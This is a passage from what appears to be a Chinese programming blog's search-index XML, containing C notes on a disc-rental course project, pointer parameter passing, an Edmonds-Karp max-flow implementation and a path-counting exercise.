class="string">"1.影碟添加\n\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"2.影碟删除\n\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"3.影碟修改\n\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"4.顾客添加\n\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"5.顾客删除\n\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"6.顾客修改\n\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"7.碟片查询\n\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"8.碟片借阅\n\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"9.碟片归还\n\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"0.退出\n\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;choose);</span><br><span class="line">        <span class="keyword">switch</span> (choose) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                discAdd(&amp;DL);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                discDelete(&amp;DL);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                discModify(&amp;DL);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                customerAdd(&amp;CL);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                customerDelete(&amp;CL);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                customerModify(&amp;CL);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                discQuery(DL);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">                borrowDisc(&amp;RL, &amp;DL, &amp;CL);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">                returnDisc(&amp;RL, &amp;DL, &amp;CL);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                save(RL, DL, CL);</span><br><span class="line">                system(<span class="string">"cls"</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"正在退出..."</span>);</span><br><span class="line">                Sleep(<span class="number">1000</span>);</span><br><span class="line">                system(<span class="string">"cls"</span>);</span><br><span class="line">                <span class="built_in">exit</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><ul>
<li><p>写完后才发现<code>time.h</code>库文件中就有<code>*time_t</code>类型的变量，十分方便记录时间。而不是像我一样，直接拿<code>long long</code>变量来表示<del>~</del>。</p>
</li>
<li><p>客户的结构体设计得不合理，应该把借阅队列设置为影碟类型，而不是简单地用字符串简单表示。</p>
</li>
<li><p>…………</p>
</li>
</ul>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>课程设计</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言的指针</title>
    <url>/2020/06/29/C%E8%AF%AD%E8%A8%80%E7%9A%84%E6%8C%87%E9%92%88/</url>
    <content><![CDATA[<h2 id="指针作为参数传递"><a href="#指针作为参数传递" class="headerlink" title="指针作为参数传递"></a>指针作为参数传递</h2><p>C语言中，当指针作为函数参数进行传递时，实际上形参和实参指向的是同一个地方，例如：<a id="more"></a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: YaleXin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-06-19 18:02:53</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-06-29 08:59:40</span></span><br><span class="line"><span class="comment"> * @LastEditors: YaleXin</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @FilePath: \my_c_workspace\some_test\pointTest-copy.c</span></span><br><span class="line"><span class="comment"> * @祈祷不出现BUG</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> *p1)</span> </span>&#123; <span class="built_in">printf</span>(<span class="string">"=== test p1 = %p ====\n"</span>, p1); &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> *p;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"=== main p = %p ====\n"</span>, p);</span><br><span class="line">    test(p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出的是：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">=== main p = <span class="number">0000000000000010</span> ====</span><br><span class="line">=== test p1 = <span class="number">0000000000000010</span> ====</span><br></pre></td></tr></table></figure>

<p>可见二者的地址是相同的。</p>
<p>所以形参对其指向的内存区域进行修改，也会影响到实参指向的内存区域，因为二者指向的区域是同一个位置，例如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: YaleXin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-06-19 18:02:53</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-06-29 09:08:30</span></span><br><span class="line"><span class="comment"> * @LastEditors: YaleXin</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @FilePath: \my_c_workspace\some_test\pointTest-copy.c</span></span><br><span class="line"><span class="comment"> * @祈祷不出现BUG</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> *p1)</span> </span>&#123; *p1 = <span class="number">2</span>; &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> *p = &amp;a;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"before a = %d\n"</span>, a);</span><br><span class="line">    test(p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"after a = %d\n"</span>, a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出的是：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">before a = <span class="number">1</span></span><br><span class="line">after a = <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>但是，我们再来看一个例子：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: YaleXin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-06-19 18:02:53</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-06-29 09:16:55</span></span><br><span class="line"><span class="comment"> * @LastEditors: YaleXin</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @FilePath: \my_c_workspace\some_test\pointTest-copy.c</span></span><br><span class="line"><span class="comment"> * @祈祷不出现BUG</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">char</span> *p1)</span> </span>&#123; p1 = <span class="string">"modified"</span>; &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *p = <span class="literal">NULL</span>;</span><br><span class="line">    test(p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"after p = %s\n"</span>, p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很容易让人以为输出的是</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">after p = modified</span><br></pre></td></tr></table></figure>

<p>但是实际上输出的是</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">after p = (null)</span><br></pre></td></tr></table></figure>

<p>下图给出这个过程中，指针的变化：</p>
<p><img src="https://q.yalexin.top/1.png" alt="1"></p>
<p>实际上是因为形参指向的区域已经与实参指向的不一致。</p>
<p>但是假如有在被调函数改变实参的地址的需求怎么办？</p>
<p>两种方法：</p>
<ol>
<li><p>被调函数返回指针：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">test</span><span class="params">(<span class="keyword">char</span> *p1)</span> </span>&#123; p1 = <span class="string">"modified"</span>; &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *p = <span class="literal">NULL</span>;</span><br><span class="line">    p = test(p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"after p = %s\n"</span>, p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是使用该方法的时候，不推荐返回局部指针，返回局部指针很容易出现错误，详见<a href="https://www.cnblogs.com/qinguoyi/p/10154804.html" target="_blank" rel="noopener">这篇文章</a></p>
<p>下面的例子就是存在问题：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">test</span><span class="params">(<span class="keyword">char</span> *p1)</span> </span>&#123;</span><br><span class="line">    p1 = <span class="string">"modified"</span>;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">20</span>] = <span class="string">""</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(str, <span class="string">"yalexin %s"</span>, p1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"str = %s\n"</span>,str);</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *p = <span class="literal">NULL</span>;</span><br><span class="line">    p = test(p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"after p = %s\n"</span>, p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出的是：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">str = yalexin modified</span><br><span class="line">after p = (null)</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用二级指针：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">test</span><span class="params">(<span class="keyword">char</span> **p1)</span> </span>&#123; *p1 = <span class="string">"modified"</span>; &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *p = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"调用函数之前p的地址是 %p\n"</span>, p);</span><br><span class="line">    test(&amp;p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"调用函数之后p的地址是 %p\n"</span>, p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"after p = %s\n"</span>, p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">调用函数之前p的地址是 <span class="number">0000000000000000</span></span><br><span class="line">调用函数之后p的地址是 <span class="number">0000000000404000</span></span><br><span class="line">after p = modified</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol>
<li>当指针指向的是一个变量，例如<code>*int* *p = &amp;a;</code>，是不能使用<code>free(p)</code>进行释放资源， <code>free()</code> 只是针对使用了 <code>malloc()</code>， <code>realloc()</code>函数进行申请的内存进行释放。 </li>
<li>使用<code>free()</code>后，相应的指针就会变为“野指针”，如果对野指针进行引用，会造成不可预期的后果，所以一般使用<code>free(p)</code>后，一般紧接着<code>p = NULL</code></li>
</ol>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>ek算法实现最大流问题</title>
    <url>/2020/05/30/ek%E7%AE%97%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%9C%80%E5%A4%A7%E6%B5%81%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>最大流问题的解决方法一般是利用<code>Ford-Fulkerson</code>算法，该算法伪码如下:<a id="more"></a></p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">for</span> each <span class="title">edge</span> (<span class="params">u, v</span>) ∈ E <span class="keyword">do</span></span></span><br><span class="line"><span class="function">	f[u, v]←0</span></span><br><span class="line"><span class="function">	f[v, u]←0</span></span><br><span class="line"><span class="function">end <span class="keyword">for</span></span></span><br><span class="line"><span class="function"><span class="keyword">while</span> there exists a path P <span class="keyword">from</span> s to t <span class="keyword">in</span> the residual network Gf</span></span><br><span class="line"><span class="function"><span class="keyword">do</span></span></span><br><span class="line"><span class="function">	<span class="title">cf</span> (<span class="params">P</span>)←mine∈P</span> &#123;cf (e)&#125;</span><br><span class="line">	<span class="function"><span class="keyword">for</span> each <span class="title">edge</span> (<span class="params">u, v</span>) ∈ P <span class="keyword">do</span></span></span><br><span class="line"><span class="function">		f[u, v]←f[u, v] + <span class="title">cf</span> (<span class="params">P</span>)</span></span><br><span class="line"><span class="function">		f[v, u]← − f[u, v]</span></span><br><span class="line"><span class="function">	end <span class="keyword">for</span></span></span><br><span class="line"><span class="function">end <span class="keyword">while</span></span></span><br></pre></td></tr></table></figure>

<p>而ek算法是对<code>Ford-Fulkerson</code>方法的实现，基于BFS。 </p>
<p>网上也有许多很好的模板：</p>
<p><a href="https://blog.csdn.net/jaster_wisdom/article/details/50942351" target="_blank" rel="noopener">最大流问题(EK算法模板)</a></p>
<p><a href="https://blog.csdn.net/creatorx/article/details/72629583" target="_blank" rel="noopener">HDU1532(最大流EK算法模板题)</a></p>
<p>我自己也写了一个：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: YaleXin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-05-30 14:55:40</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-05-30 17:26:38</span></span><br><span class="line"><span class="comment"> * @LastEditors: YaleXin</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @FilePath: \my_c_workspace\others\maxFlow.c</span></span><br><span class="line"><span class="comment"> * @祈祷不出现BUG</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXLEN 10001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> min(a, b) a &lt; b ? a : b</span></span><br><span class="line"><span class="keyword">int</span> capacity[MAXLEN][MAXLEN] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">// 记录路径上的前驱，用于添加反向边</span></span><br><span class="line"><span class="keyword">int</span> pre[MAXLEN];</span><br><span class="line"><span class="keyword">int</span> vertexNum, arcNum;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BFS</span><span class="params">(<span class="keyword">int</span> start, <span class="keyword">int</span> <span class="built_in">end</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= vertexNum; i++) pre[i] = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> flow[vertexNum + <span class="number">1</span>], <span class="built_in">queue</span>[vertexNum + <span class="number">1</span>], front = <span class="number">0</span>, rear = <span class="number">0</span>;</span><br><span class="line">    flow[start] = <span class="number">32767</span>;</span><br><span class="line">    <span class="comment">// 源点进队列</span></span><br><span class="line">    <span class="built_in">queue</span>[++rear] = start;</span><br><span class="line">    <span class="keyword">while</span> (front != rear) &#123;</span><br><span class="line">        <span class="keyword">int</span> frontIndex = <span class="built_in">queue</span>[++front];</span><br><span class="line">        <span class="keyword">if</span> (frontIndex == <span class="built_in">end</span>) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= vertexNum; i++) &#123;</span><br><span class="line">            <span class="comment">// 存在有向边并且点i没有被访问过</span></span><br><span class="line">            <span class="keyword">if</span> (i != start &amp;&amp; capacity[frontIndex][i] &gt; <span class="number">0</span> &amp;&amp; pre[i] == <span class="number">-1</span>) &#123;</span><br><span class="line">                pre[i] = frontIndex;</span><br><span class="line">                flow[i] = <span class="built_in">min</span>(capacity[frontIndex][i], flow[frontIndex]);</span><br><span class="line">                <span class="built_in">queue</span>[++rear] = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 残余网络中不存在增广路</span></span><br><span class="line">    <span class="keyword">if</span> (pre[<span class="built_in">end</span>] == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> flow[<span class="built_in">end</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getMaxFlow</span><span class="params">(<span class="keyword">int</span> S, <span class="keyword">int</span> T)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> minF, preIndex, th, sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((minF = BFS(S, T)) != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="comment">// 更新残留网络</span></span><br><span class="line">        th = T;</span><br><span class="line">        preIndex = pre[th];</span><br><span class="line">        <span class="keyword">while</span> (preIndex != <span class="number">-1</span>) &#123;</span><br><span class="line">            capacity[th][preIndex] += minF;</span><br><span class="line">            capacity[preIndex][th] -= minF;</span><br><span class="line">            th = preIndex;</span><br><span class="line">            preIndex = pre[th];</span><br><span class="line">        &#125;</span><br><span class="line">        sum += minF;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> SVertex, TVertex;</span><br><span class="line">    <span class="comment">// printf("请输入点的个数和有向边的个数以及源点汇点编号：\n");</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d%d%d"</span>, &amp;vertexNum, &amp;arcNum, &amp;SVertex, &amp;TVertex);</span><br><span class="line">    <span class="comment">// printf("请依次输入每条有向边的容量，格式为 1 2 3：\n");</span></span><br><span class="line">    <span class="keyword">int</span> u, v, c;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= arcNum; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;u, &amp;v, &amp;c);</span><br><span class="line">        <span class="comment">// 有可能输入重复边</span></span><br><span class="line">        capacity[u][v] += c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>, getMaxFlow(SVertex, TVertex));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">4 6 1 4</span></span><br><span class="line"><span class="comment">1 3 5</span></span><br><span class="line"><span class="comment">1 4 20</span></span><br><span class="line"><span class="comment">1 2 10</span></span><br><span class="line"><span class="comment">3 4 50</span></span><br><span class="line"><span class="comment">3 2 30</span></span><br><span class="line"><span class="comment">2 4 40</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>BFS</tag>
        <tag>最大流</tag>
      </tags>
  </entry>
  <entry>
    <title>马拦过河卒</title>
    <url>/2020/05/24/%E9%A9%AC%E5%85%B0%E8%BF%87%E6%B2%B3%E5%8D%92/</url>
    <content><![CDATA[<blockquote>
<p>题目来源：<a href="https://www.dotcpp.com/oj/problem1266.html" target="_blank" rel="noopener">C语言网1266</a></p>
</blockquote>
<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p> 棋盘上A点有一个过河卒，需要走到目标B点。卒行走的规则：可以向下、或者向右。同时在棋盘上C点有一个对方的马，该马所在的点和所有跳跃一步可达的点称为对方马的控制点。因此称之为“马拦过河卒”。<br>棋盘用坐标表示，A点(0, 0)、B点(n, m)(n, m为不超过15的整数)，同样马的位置坐标是需要给出的。现在要求你计算出卒从A点能够到达B点的路径的条数，假设马的位置是固定不动的，并不是卒走一步马走一步。 <a id="more"></a></p>
<h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p> 一行四个数据，分别表示B点坐标和马的坐标。（保证所有的数据有解） </p>
<h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p> 一个数据，表示所有的路径条数。 </p>
<h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">6 6 3 5</span><br></pre></td></tr></table></figure>

<h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">6</span><br></pre></td></tr></table></figure>

<h2 id="问题求解"><a href="#问题求解" class="headerlink" title="问题求解"></a>问题求解</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: YaleXin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-05-24 13:34:01</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-05-24 14:16:01</span></span><br><span class="line"><span class="comment"> * @LastEditors: YaleXin</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @FilePath: \my_c_workspace\dotcpp\1266.c</span></span><br><span class="line"><span class="comment"> * @祈祷不出现BUG</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @x : 马的横坐标  @y : 马的纵坐标</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span> path[<span class="number">16</span>][<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;, sum = <span class="number">0</span>, n, m, x, y;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 初始化禁区</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setHorse</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    path[x][y] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ((x - <span class="number">2</span>) &gt;= <span class="number">0</span> &amp;&amp; (y - <span class="number">1</span>) &gt;= <span class="number">0</span>) path[x - <span class="number">2</span>][y - <span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ((x - <span class="number">1</span>) &gt;= <span class="number">0</span> &amp;&amp; (y - <span class="number">2</span>) &gt;= <span class="number">0</span>) path[x - <span class="number">1</span>][y - <span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ((x - <span class="number">2</span>) &gt;= <span class="number">0</span> &amp;&amp; (y + <span class="number">1</span>) &lt;= m) path[x - <span class="number">2</span>][y + <span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ((x - <span class="number">1</span>) &gt;= <span class="number">0</span> &amp;&amp; (y + <span class="number">2</span>) &lt;= m) path[x - <span class="number">1</span>][y + <span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ((x + <span class="number">2</span>) &lt;= n &amp;&amp; (y - <span class="number">1</span>) &gt;= <span class="number">0</span>) path[x + <span class="number">2</span>][y - <span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ((x + <span class="number">1</span>) &lt;= n &amp;&amp; (y - <span class="number">2</span>) &gt;= <span class="number">0</span>) path[x + <span class="number">1</span>][y - <span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ((x + <span class="number">2</span>) &lt;= n &amp;&amp; (y + <span class="number">1</span>) &lt;= m) path[x + <span class="number">2</span>][y + <span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ((x + <span class="number">1</span>) &lt;= n &amp;&amp; (y + <span class="number">2</span>) &lt;= m) path[x + <span class="number">1</span>][y + <span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">findPath</span><span class="params">(<span class="keyword">int</span> nowX, <span class="keyword">int</span> nowY)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (nowX == n &amp;&amp; nowY == m) &#123;</span><br><span class="line">        sum++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 先往右</span></span><br><span class="line">    <span class="keyword">if</span> ((nowY + <span class="number">1</span>) &lt;= m &amp;&amp; !path[nowX][nowY + <span class="number">1</span>]) findPath(nowX, nowY + <span class="number">1</span>);</span><br><span 